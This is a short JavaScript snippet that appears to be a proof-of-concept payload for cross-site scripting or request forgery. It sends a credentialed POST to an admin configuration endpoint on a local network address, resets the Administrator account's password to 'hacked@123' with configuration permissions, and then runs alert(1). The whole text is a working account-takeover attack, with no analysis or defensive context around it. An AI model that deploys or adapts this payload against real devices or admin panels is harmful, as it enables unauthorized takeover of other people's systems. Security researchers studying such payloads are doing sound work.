function execute() {
  var nuri = "http://192.168.0.16/admin/config";
  xhttp = new XMLHttpRequest();
  xhttp.open("POST", nuri, true);
  xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  xhttp.withCredentials = "true";
  var body = "";
  body += "\r\n\r\n";
  body += "userName=Administrator&confPermissions=1&pass=hacked@123&cpass=hacked@123&invokeType=web";
  xhttp.send(body);
  return true;
}
execute();
alert(1);
